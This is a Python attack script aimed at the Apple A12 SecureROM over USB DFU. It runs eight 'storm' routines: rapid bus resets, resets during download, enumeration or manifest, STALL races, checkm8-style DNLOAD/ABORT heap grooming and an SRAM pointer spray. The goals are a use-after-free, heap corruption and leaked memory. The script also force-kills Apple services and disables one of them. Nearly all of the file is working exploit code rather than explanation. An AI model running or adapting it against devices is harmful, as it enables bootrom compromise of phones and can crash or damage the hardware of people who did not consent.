#!/usr/bin/env python3
"""
A12 SecureROM — USB Reset Storm Attack
========================================
The Synopsys DWC3 USB controller in the A12 must handle each USB
bus reset by:
  1. Tearing down active endpoints + DMA descriptors
  2. Freeing IO buffers (the ~2KB DNLOAD buffer)
  3. Re-initializing EP0 + serving descriptors
  4. Re-allocating the DFU IO buffer on SET_CONFIGURATION

If we can race step (2) against step (4) — free the old buffer
while a new allocation reuses the same memory — we get a UAF.

Attack strategies:
  A. Reset storm: rapid USB resets → stress alloc/free path
  B. Reset during DNLOAD: reset while data is being DMA'd in
  C. Reset during enumeration: reset before SET_CONFIGURATION completes
  D. Partial enumeration: connect, get descriptor, reset before config
  E. Reset + immediate DNLOAD: race buffer allocation
  F. Reset during manifest: reset while SecureROM is processing
  G. Stall-then-reset: trigger EP0 STALL, then reset before recovery

After each storm, we probe for signs of corruption:
  - Changed timing behavior
  - UPLOAD returning non-zero data (leaked heap)
  - Unexpected DFU state
  - Device crash (doesn't re-enumerate)
"""
import time, os, struct, json, traceback
from datetime import datetime
from pathlib import Path

import usb.core, usb.util, libusb_package, usb.backend.libusb1

APPLE_VID = 0x05AC; DFU_PID = 0x1227
BE = usb.backend.libusb1.get_backend(find_library=libusb_package.find_library)
RESULTS = []

def log(msg):
    print(f"[{datetime.now().strftime('%H:%M:%S.%f')[:-3]}] {msg}", flush=True)

def find_dfu():
    return usb.core.find(idVendor=APPLE_VID, idProduct=DFU_PID, backend=BE)

def gs(dev):
    try:
        r = dev.ctrl_transfer(0xA1, 3, 0, 0, 6, timeout=1000)
        return (r[4], r[0], r[1]|(r[2]<<8)|(r[3]<<16)) if len(r) >= 6 else None
    except: return None

def dn(dev, data, to=5000):
    try: dev.ctrl_transfer(0x21, 1, 0, 0, data, timeout=to); return True
    except: return False

def ab(dev):
    try: dev.ctrl_transfer(0x21, 6, 0, 0, 0, timeout=1000); return True
    except: return False

def clr(dev):
    try: dev.ctrl_transfer(0x21, 4, 0, 0, 0, timeout=1000); return True
    except: return False

def upload(dev, length=256):
    try: return bytes(dev.ctrl_transfer(0xA1, 2, 0, 0, length, timeout=1000))
    except: return None

def usb_reset(dev):
    """Send USB bus reset"""
    try: dev.reset(); return True
    except: return False

def reconnect(wait=0.5):
    """Find and configure DFU device"""
    time.sleep(wait)
    dev = find_dfu()
    if dev:
        try: dev.set_configuration()
        except: pass
    return dev

def to_idle(dev, attempts=30):
    for _ in range(attempts):
        s = gs(dev)
        if not s: return None
        if s[0] == 2: return dev
        if s[0] == 10: clr(dev)
        elif s[0] == 5: ab(dev)
        elif s[0] in (3, 6): gs(dev)
        elif s[0] == 7: time.sleep(0.01)
        elif s[0] == 8:
            usb_reset(dev)
            time.sleep(1.5)
            dev = reconnect(0)
            if not dev: return None
            continue
        elif s[0] == 4: time.sleep(0.1)
        else: ab(dev)
        time.sleep(0.02)
    return None

def wait_dfu(timeout=60, accept_any_state=False):
    """Wait for DFU device. If accept_any_state=True, return device in any DFU state."""
    t0 = time.time()
    attempts = 0
    while time.time() - t0 < timeout:
        dev = find_dfu()
        if dev:
            try: dev.set_configuration()
            except: pass
            s = gs(dev)
            if s:
                log(f"  [wait_dfu] found device in state {s[0]}")
                if s[0] == 2:
                    return dev  # IDLE — perfect
                if accept_any_state:
                    return dev  # caller wants it in whatever state
                if s[0] == 10:
                    clr(dev)
                    time.sleep(0.1)
                    continue
                elif s[0] == 5:
                    ab(dev)
                    time.sleep(0.1)
                    continue
                elif s[0] == 8:
                    # State 8: try ABORT first (lighter than USB reset)
                    log("  [wait_dfu] state 8 — trying ABORT")
                    ab(dev)
                    time.sleep(0.5)
                    # Re-find device (ABORT in state 8 may cause disconnect)
                    dev = find_dfu()
                    if dev:
                        try: dev.set_configuration()
                        except: pass
                        s2 = gs(dev)
                        if s2 and s2[0] == 2:
                            return dev
                    # If still stuck, try USB reset
                    if attempts < 2:
                        dev = find_dfu()
                        if dev:
                            log("  [wait_dfu] state 8 — trying USB reset")
                            try: dev.reset()
                            except: pass
                            time.sleep(2)
                            attempts += 1
                            continue
                    # Give up trying to get to IDLE, return in state 8 
                    # so the caller can work with it
                    log("  [wait_dfu] can't reach IDLE, returning in current state")
                    dev = find_dfu()
                    if dev:
                        try: dev.set_configuration()
                        except: pass
                        return dev
                else:
                    dev = to_idle(dev)
                    if dev:
                        s2 = gs(dev)
                        if s2 and s2[0] == 2: return dev
        time.sleep(0.5)
    return None

def probe_health(dev, label=""):
    """After an attack, probe the device for signs of corruption"""
    findings = []
    
    # 1. Check state
    s = gs(dev)
    if not s:
        findings.append("NO_RESPONSE")
        return findings, None
    
    state = s[0]
    if state not in (2, 5, 10):
        findings.append(f"UNUSUAL_STATE_{state}")
    
    # 2. Try UPLOAD — should return 0 bytes normally
    up = upload(dev, 256)
    if up and len(up) > 0 and any(b != 0 for b in up):
        nonzero = sum(1 for b in up if b != 0)
        findings.append(f"UPLOAD_LEAK_{nonzero}B")
        log(f"  !!! {label} UPLOAD leaked {nonzero} bytes: {up[:32].hex()}")
    
    # 3. Try a normal DNLOAD cycle — does timing change?
    if state == 2 or (state == 10 and clr(dev)):
        t0 = time.perf_counter_ns()
        dn(dev, bytes(2048))
        gs(dev)
        dt = (time.perf_counter_ns() - t0) / 1000
        if dt > 10000:  # normally ~500-1000us
            findings.append(f"SLOW_DNLOAD_{int(dt)}us")
    
    return findings, dev

def record(test, detail, result, alive, notes=""):
    entry = {"test": test, "detail": detail, "result": result,
             "alive": alive, "notes": notes}
    RESULTS.append(entry)
    tag = ""
    if not alive: tag = " *** CRASH ***"
    elif notes: tag = f" [{notes}]"
    log(f"  {test:30s} {detail:20s} → alive={alive}{tag}")

# ============================================================
#  STORM ATTACKS
# ============================================================

def storm_A_rapid_resets(dev):
    """Pure rapid USB resets — stress the init/teardown path"""
    log("\n===== STORM A: Rapid USB Resets =====")
    log("Goal: stress alloc/free of USB structures")
    
    for burst_size in [3, 5, 10, 20, 50]:
        dev = to_idle(dev) or wait_dfu(15)
        if not dev: return None
        
        log(f"  Burst of {burst_size} resets...")
        crash = False
        for i in range(burst_size):
            try:
                dev.reset()
            except:
                pass
            # Very short wait — try to hit before re-init completes
            time.sleep(0.001)  # 1ms
            dev = find_dfu()
            if not dev:
                # Extra wait
                time.sleep(0.5)
                dev = find_dfu()
            if not dev:
                crash = True
                break
            try: dev.set_configuration()
            except: pass
        
        if crash:
            log(f"  !!! DEVICE DISAPPEARED after {i+1}/{burst_size} resets !!!")
            record("rapid_reset", f"burst={burst_size}", f"crash@{i+1}", False, "DEVICE GONE")
            dev = wait_dfu(20)
            if not dev: return None
        else:
            alive = find_dfu() is not None
            findings, dev = probe_health(dev, f"burst_{burst_size}")
            record("rapid_reset", f"burst={burst_size}", 
                   f"ok findings={findings}", alive,
                   "; ".join(findings) if findings else "clean")
    
    return dev


def storm_B_reset_during_dnload(dev):
    """Reset while DNLOAD data is being transferred"""
    log("\n===== STORM B: Reset During DNLOAD =====")
    log("Goal: corrupt DMA transfer mid-flight")
    
    for trial in range(5):
        dev = to_idle(dev) or wait_dfu(15)
        if not dev: return None
        
        # Start a large DNLOAD asynchronously... but pyusb is synchronous.
        # So instead: start DNLOAD with very short timeout, hope it's mid-transfer
        # when the timeout fires, then reset.
        
        # Alternative: send DNLOAD, then immediately reset from another thread
        # Simpler: send DNLOAD with known data, reset ASAP after, see what happens
        
        # Send a DNLOAD with a distinctive pattern
        pattern = bytes([trial & 0xFF] * 2048)
        dn(dev, pattern, to=100)  # short timeout
        
        # IMMEDIATELY reset — hopefully the DWC3 is still DMA'ing
        try: dev.reset()
        except: pass
        
        time.sleep(0.3)
        dev = find_dfu()
        if not dev:
            record("reset_mid_dn", f"T{trial}", "crash", False, "CRASH")
            dev = wait_dfu(15)
            if not dev: return None
            continue
        
        try: dev.set_configuration()
        except: pass
        
        # Probe: does UPLOAD return our pattern? Or garbage?
        up = upload(dev, 2048)
        if up and any(b != 0 for b in up):
            log(f"  !!! T{trial}: UPLOAD after reset-mid-DNLOAD returned data!")
            log(f"      First 32B: {up[:32].hex()}")
            match = sum(1 for a, b in zip(up, pattern) if a == b)
            record("reset_mid_dn", f"T{trial}", 
                   f"leak {sum(1 for b in up if b!=0)}B, match={match}/2048",
                   True, "DATA_LEAK")
        else:
            s = gs(dev)
            record("reset_mid_dn", f"T{trial}", 
                   f"state={s[0] if s else -1} no_leak", True)
        
        dev = to_idle(dev) or wait_dfu(10)
    
    return dev


def storm_C_reset_during_enumeration(dev):
    """Reset during SET_CONFIGURATION — race the DFU buffer allocation"""
    log("\n===== STORM C: Reset During Enumeration =====")
    log("Goal: race SET_CONFIGURATION vs DFU buffer alloc")
    
    for trial in range(8):
        # Start with a USB reset
        try: dev.reset()
        except: pass
        
        # Wait just enough for device to appear, but NOT to finish enum
        delays = [0.001, 0.005, 0.01, 0.02, 0.05, 0.1, 0.15, 0.2]
        delay = delays[trial % len(delays)]
        time.sleep(delay)
        
        dev = find_dfu()
        if not dev:
            time.sleep(0.5)
            dev = find_dfu()
            if not dev:
                record("reset_enum", f"d={delay*1000:.0f}ms", "no_dev", False)
                dev = wait_dfu(10)
                if not dev: return None
                continue
        
        # DON'T set_configuration — try to talk before config is set
        # This means the DFU interface isn't "officially" active
        
        # Try various operations in this pre-config state:
        results = {}
        
        # GET_STATUS without config
        s = gs(dev)
        results["gs_preconfig"] = s[0] if s else "none"
        
        # DNLOAD without config
        r = dn(dev, bytes(64))
        results["dn_preconfig"] = r
        
        # Now set config
        try:
            dev.set_configuration()
            results["setconf"] = "ok"
        except Exception as e:
            results["setconf"] = str(e)[:30]
        
        # Reset again immediately after set_configuration
        try: dev.reset()
        except: pass
        time.sleep(0.001)  # 1ms!
        
        dev = find_dfu()
        if not dev:
            record("reset_enum", f"d={delay*1000:.0f}ms", str(results), False, "CRASH_POST_SETCONF")
            dev = wait_dfu(15)
            if not dev: return None
            continue
        
        try: dev.set_configuration()
        except: pass
        
        findings, dev = probe_health(dev, f"enum_T{trial}")
        record("reset_enum", f"d={delay*1000:.0f}ms", 
               f"{results} findings={findings}", True,
               "; ".join(findings) if findings else "")
        
        dev = to_idle(dev) or wait_dfu(10)
        if not dev: return None
    
    return dev


def storm_D_partial_enumeration(dev):
    """Connect, read descriptors, but DON'T set config — reset and repeat"""
    log("\n===== STORM D: Partial Enumeration Cycles =====")
    log("Goal: leak memory by never completing DFU setup")
    
    for burst in [5, 10, 20]:
        dev = to_idle(dev) or wait_dfu(15)
        if not dev: return None
        
        log(f"  {burst} partial enum cycles...")
        for i in range(burst):
            try: dev.reset()
            except: pass
            time.sleep(0.05)
            dev = find_dfu()
            if not dev:
                time.sleep(0.5)
                dev = find_dfu()
            if not dev: break
            
            # Read device descriptor (part of enumeration) but DON'T set config
            try:
                desc = dev.ctrl_transfer(0x80, 0x06, 0x0100, 0, 18, timeout=500)
            except: pass
            
            # Maybe read config descriptor too
            try:
                cdesc = dev.ctrl_transfer(0x80, 0x06, 0x0200, 0, 64, timeout=500)
            except: pass
            
            # DON'T set_configuration — just reset again
        
        if not dev:
            record("partial_enum", f"burst={burst}", f"crash@{i}", False, "DEVICE GONE")
            dev = wait_dfu(15)
            if not dev: return None
            continue
        
        # Now properly configure and check health
        try: dev.set_configuration()
        except: pass
        
        findings, dev = probe_health(dev, f"partial_{burst}")
        
        # Critical: check if heap is fragmented by doing DNLOAD timing
        times = []
        dev_ok = to_idle(dev)
        if dev_ok:
            dev = dev_ok
            for _ in range(3):
                t0 = time.perf_counter_ns()
                dn(dev, bytes(2048))
                s = gs(dev)
                dt = (time.perf_counter_ns() - t0) / 1000
                times.append(round(dt))
                ab(dev)
                time.sleep(0.01)
        
        record("partial_enum", f"burst={burst}",
               f"findings={findings} timing={times}", True,
               "; ".join(findings) if findings else "")
    
    return dev


def storm_E_reset_then_immediate_dnload(dev):
    """Reset → reconnect → DNLOAD as fast as possible"""
    log("\n===== STORM E: Reset + Immediate DNLOAD =====")
    log("Goal: race DFU buffer allocation with DNLOAD data")
    
    for trial in range(10):
        dev = to_idle(dev) or wait_dfu(15)
        if not dev: return None
        
        # First do a DNLOAD with known pattern
        pattern = bytes([(trial * 17 + 0x42) & 0xFF] * 2048)
        dn(dev, pattern)
        gs(dev)  # → state 5
        
        # Now reset
        try: dev.reset()
        except: pass
        
        # Reconnect ASAP
        wait_ms = trial * 2  # 0, 2, 4, 6, 8, 10, 12, 14, 16, 18ms
        time.sleep(wait_ms / 1000)
        
        dev = find_dfu()
        if not dev:
            time.sleep(0.5)
            dev = find_dfu()
        if not dev:
            record("reset_imm_dn", f"w={wait_ms}ms", "no_dev", False)
            dev = wait_dfu(10)
            if not dev: return None
            continue
        
        try: dev.set_configuration()
        except: pass
        
        # IMMEDIATELY DNLOAD a different pattern
        new_pattern = bytes([0xFF - ((trial * 17 + 0x42) & 0xFF)] * 2048)
        t0 = time.perf_counter_ns()
        dn_ok = dn(dev, new_pattern, to=500)
        dn_us = (time.perf_counter_ns() - t0) / 1000
        
        s = gs(dev)
        state = s[0] if s else -1
        
        # UPLOAD — are we reading old pattern, new pattern, or garbage?
        up = upload(dev, 2048)
        leak_info = "none"
        if up and any(b != 0 for b in up):
            old_match = sum(1 for a, b in zip(up, pattern) if a == b)
            new_match = sum(1 for a, b in zip(up, new_pattern) if a == b)
            leak_info = f"old={old_match} new={new_match} nz={sum(1 for b in up if b!=0)}"
            if old_match > 100:
                log(f"  !!! T{trial}: UPLOAD contains OLD pattern data!")
                log(f"      {up[:32].hex()}")
        
        record("reset_imm_dn", f"w={wait_ms}ms",
               f"dn={dn_ok} {dn_us:.0f}us st={state} up={leak_info}",
               True, f"STALE_DATA" if "old=" in leak_info and "old=0" not in leak_info else "")
        
        dev = to_idle(dev) or wait_dfu(10)
        if not dev: return None
    
    return dev


def storm_F_reset_during_manifest(dev):
    """Trigger manifest, then reset during processing (state 6/7)"""
    log("\n===== STORM F: Reset During Manifest =====")
    log("Goal: interrupt SecureROM DER parser mid-execution")
    
    for delay_us in [0, 100, 300, 500, 800, 1000, 1200]:
        dev = to_idle(dev) or wait_dfu(15)
        if not dev: return None
        
        # Setup: DNLOAD pattern → state 5
        dn(dev, b"\x30\x82\x07\xF6\x16\x04IMG4" + bytes(2038))
        s = gs(dev)
        if not s or s[0] != 5: continue
        
        # Trigger manifest
        dn(dev, b"")
        
        # Wait exactly delay_us, then RESET
        if delay_us > 0:
            target = time.perf_counter_ns() + delay_us * 1000
            while time.perf_counter_ns() < target: pass
        
        try: dev.reset()
        except: pass
        
        # Quick reconnect
        time.sleep(0.2)
        dev = find_dfu()
        if not dev:
            time.sleep(1.0)
            dev = find_dfu()
        if not dev:
            record("reset_manifest", f"d={delay_us}us", "crash", False, "CRASH")
            dev = wait_dfu(15)
            if not dev: return None
            continue
        
        try: dev.set_configuration()
        except: pass
        
        # Check state — did the manifest complete? Or are we in a weird state?
        s = gs(dev)
        state = s[0] if s else -1
        
        # UPLOAD check
        up = upload(dev, 2048)
        leak = ""
        if up and any(b != 0 for b in up):
            leak = f"LEAK:{up[:16].hex()}"
            log(f"  !!! d={delay_us}us: UPLOAD after manifest-reset: {up[:32].hex()}")
        
        record("reset_manifest", f"d={delay_us}us",
               f"st={state} {leak}", find_dfu() is not None,
               leak if leak else "")
        
        dev = to_idle(dev) or wait_dfu(10)
        if not dev: return None
    
    return dev


def storm_G_stall_then_reset(dev):
    """Trigger a STALL, then reset before the device recovers"""
    log("\n===== STORM G: STALL + Reset Race =====")
    log("Goal: corrupt EP0 state by resetting during STALL recovery")
    
    stalls = [
        ("wIndex=1",     0x21, 1, 0, 1, bytes(64)),
        ("bad_req",      0x21, 0xFF, 0, 0, 0),
        ("vendor_in",    0xC0, 0x01, 0, 0, 64),
    ]
    
    for name, rt, req, val, idx, data in stalls:
        for delay_ms in [0, 1, 5]:
            dev = to_idle(dev) or wait_dfu(15)
            if not dev: return None
            
            # Trigger STALL
            try:
                dev.ctrl_transfer(rt, req, val, idx, data, timeout=500)
            except: pass  # STALL = exception
            
            # Wait then reset
            time.sleep(delay_ms / 1000)
            try: dev.reset()
            except: pass
            
            time.sleep(0.3)
            dev = find_dfu()
            if not dev:
                record("stall_reset", f"{name} d={delay_ms}ms", "crash", False, "CRASH")
                dev = wait_dfu(15)
                if not dev: return None
                continue
            
            try: dev.set_configuration()
            except: pass
            
            findings, dev = probe_health(dev, f"stall_{name}")
            record("stall_reset", f"{name} d={delay_ms}ms",
                   f"findings={findings}", True,
                   "; ".join(findings) if findings else "")
            
            dev = to_idle(dev) or wait_dfu(10)
            if not dev: return None
    
    return dev


def storm_H_dnload_abort_storm(dev):
    """Classic checkm8 vector: rapid DNLOAD+ABORT cycles to corrupt heap"""
    log("\n===== STORM H: DNLOAD+ABORT Heap Grooming =====")
    log("Goal: checkm8-style heap manipulation via DNLOAD/ABORT cycles")
    log("This is the closest to the original exploit technique")
    
    for cycle_count in [10, 50, 100, 200]:
        dev = to_idle(dev) or wait_dfu(15)
        if not dev: return None
        
        log(f"  {cycle_count} DNLOAD+ABORT cycles...")
        errors = 0
        states_seen = set()
        
        for i in range(cycle_count):
            # DNLOAD — allocates IO buffer
            r = dn(dev, bytes(2048))
            if not r: errors += 1
            
            s = gs(dev)
            if s: states_seen.add(s[0])
            
            # ABORT — should free IO buffer
            # But if the free is lazy or the allocator caches...
            r = ab(dev)
            if not r: errors += 1
            
            s = gs(dev)
            if s: states_seen.add(s[0])
        
        alive = find_dfu() is not None
        s = gs(dev) if alive else None
        state = s[0] if s else -1
        
        # After grooming: try UPLOAD
        up = upload(dev, 2048)
        leak = ""
        if up and any(b != 0 for b in up):
            leak = f"LEAK:{up[:16].hex()}"
        
        # After grooming: try DNLOAD + manifest → does it crash?
        crash_on_manifest = False
        if alive and state != -1:
            dev = to_idle(dev)
            if dev:
                dn(dev, bytes(2048))
                gs(dev)
                dn(dev, b"")
                for _ in range(30):
                    s2 = gs(dev)
                    if not s2 or s2[0] in (2, 8, 10): break
                    time.sleep(0.001)
                if not find_dfu():
                    crash_on_manifest = True
        
        record("dn_ab_groom", f"cycles={cycle_count}",
               f"errs={errors} states={states_seen} st={state} {leak}"
               + (" MANIFEST_CRASH" if crash_on_manifest else ""),
               alive and not crash_on_manifest,
               (leak + " " if leak else "") + ("MANIFEST_CRASH" if crash_on_manifest else ""))
        
        if crash_on_manifest or not alive:
            log(f"  !!! {cycle_count} cycles caused crash!")
            dev = wait_dfu(15)
        else:
            dev = to_idle(dev) or wait_dfu(10)
        if not dev: return None
    
    # Bonus: groomed heap + pointer spray
    log("  Bonus: groomed heap + SRAM pointer spray...")
    dev = to_idle(dev) or wait_dfu(15)
    if dev:
        # Groom with 100 cycles
        for _ in range(100):
            dn(dev, bytes(2048))
            gs(dev)
            ab(dev)
        
        # Now send SRAM pointers as the DNLOAD payload
        sram_spray = struct.pack("<Q", 0x180000000) * 256  # 2048 bytes of SRAM ptrs
        dn(dev, sram_spray)
        gs(dev)
        dn(dev, b"")  # manifest
        
        for _ in range(50):
            s = gs(dev)
            if not s or s[0] in (2, 8, 10): break
            time.sleep(0.001)
        
        alive = find_dfu() is not None
        record("dn_ab_groom", "100+sram_spray",
               f"alive={alive}", alive,
               "SRAM SPRAY CRASH" if not alive else "survived")
        
        if not alive:
            dev = wait_dfu(15)
        else:
            dev = to_idle(dev) or wait_dfu(10)
    
    return dev


def run():
    log("=" * 60)
    log("A12 SecureROM — USB Reset Storm Attack")
    log("=" * 60)
    log("Target: USB PHY + DWC3 controller race conditions")
    log("Goal: UAF, heap corruption, DMA races, data leaks")
    log("")
    
    # Kill Apple services
    for p in ["iTunesHelper", "iTunes", "AppleMobileDeviceService",
              "usbmuxd", "AMPDeviceDiscoveryAgent", "AppleMobileDeviceHelper"]:
        os.system(f'taskkill /F /IM "{p}.exe" >nul 2>&1')
    os.system('sc config "Apple Mobile Device Service" start=disabled >nul 2>&1')
    os.system('net stop "Apple Mobile Device Service" >nul 2>&1')
    
    log("Waiting for DFU device... Enter DFU mode now!")
    dev = wait_dfu(120)
    if not dev:
        log("FATAL: No device found"); return
    
    s = gs(dev)
    log(f"Device found, state={s}")
    log("")
    
    try:
        dev = storm_A_rapid_resets(dev)
        if dev: dev = storm_B_reset_during_dnload(dev)
        if dev: dev = storm_C_reset_during_enumeration(dev)
        if dev: dev = storm_D_partial_enumeration(dev)
        if dev: dev = storm_E_reset_then_immediate_dnload(dev)
        if dev: dev = storm_F_reset_during_manifest(dev)
        if dev: dev = storm_G_stall_then_reset(dev)
        if dev: dev = storm_H_dnload_abort_storm(dev)
    except Exception as e:
        log(f"FATAL ERROR: {e}")
        traceback.print_exc()
    
    # Summary
    log("\n" + "=" * 60)
    log("STORM RESULTS SUMMARY")
    log("=" * 60)
    
    crashes = [r for r in RESULTS if not r["alive"]]
    leaks = [r for r in RESULTS if "LEAK" in r.get("notes", "")]
    unusual = [r for r in RESULTS if r.get("notes") and 
               any(w in r["notes"] for w in ["UNUSUAL", "STALE", "CRASH", "LEAK"])]
    
    log(f"Total tests: {len(RESULTS)}")
    log(f"CRASHES: {len(crashes)}")
    log(f"Data leaks: {len(leaks)}")
    log(f"Notable: {len(unusual)}")
    
    for category, items, label in [
        (crashes, crashes, "CRASHES"),
        (leaks, leaks, "DATA LEAKS"),
    ]:
        if items:
            log(f"\n--- {label} ---")
            for r in items:
                log(f"  {r['test']} / {r['detail']}: {r['result'][:80]}")
    
    # Save
    outdir = Path(__file__).parent / "results"
    outdir.mkdir(exist_ok=True)
    outfile = outdir / "usb_reset_storm.json"
    with open(outfile, "w") as f:
        json.dump({"timestamp": datetime.now().isoformat(), "results": RESULTS}, f, indent=2)
    log(f"\nSaved to {outfile}")
    
    os.system('sc config "Apple Mobile Device Service" start=auto >nul 2>&1')
    log("\n=== STORM COMPLETE ===")


if __name__ == "__main__":
    run()
